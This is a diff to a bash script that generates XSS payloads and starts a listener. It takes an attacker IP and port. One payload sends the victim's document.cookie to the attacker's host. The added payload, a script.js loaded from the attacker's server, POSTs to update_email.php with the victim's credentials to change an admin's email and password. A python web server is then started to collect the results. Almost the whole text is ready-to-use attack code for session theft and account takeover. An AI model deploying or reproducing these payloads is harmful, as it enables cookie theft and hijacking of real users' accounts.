@@ -2,7 +2,7 @@
 
 function usage() {
     cat << EOF
-Usage: $0 <IP> <PORT>
+Usage: $0 <Attacker_IP> <Attacker_PORT>
 
 Options:
   -h, --help   Show this help message and exit
@@ -29,12 +29,38 @@ fi
 
 IP="$1"
 PORT="$2"
-PAYLOAD="0xmr<script>var i = new Image(); i.src=\"http://$IP:$PORT/?c=\" + document.cookie;</script>"
-#echo " [+] Use this Payload ====> $PAYLOAD"
-echo "        [  Payload 1  ] "
-echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
-echo -e "\033[1;41;37m$PAYLOAD\033[0m"
-echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ "
+BLUE='\033[1;34m'
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+NC='\033[0m'
+PAYLOAD1="====> 0xmr<script>var i = new Image(); i.src=\"http://$IP:$PORT/?c=\" + document.cookie;</script>"
+PAYLOAD2="  Save into the file called  [ script.js ]
 
-echo " [+] Starting WEB SERVER on port $PORT..."
+fetch('/update_email.php', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type':'application/x-www-form-urlencoded'},
+  body: 'email=pwnedadmin@evil.local&password=pwnadmin'
+});
+
+
+ ====> <script src="http://$IP:$PORT/script.js"></script>"
+ 
+echo -e "${RED}📨 Use this Payloads:${NC}"
+echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+#echo -e "\033[1;41;37m$PAYLOAD1\033[0m"
+echo -e "     "
+echo -e "${GREEN} $PAYLOAD1 ${NC}"
+echo -e "${BLUE} ${NC}"
+echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+
+echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+echo -e "  "
+echo -e "${GREEN} $PAYLOAD2 ${NC}"
+echo -e " ${BLUE} ${NC} "
+echo -e " "
+echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+
+echo  -e "${RED} [+] Starting WEB SERVER on port $PORT...${NC}"
+echo -e "${NC} "
 sudo python3 -m http.server $PORT
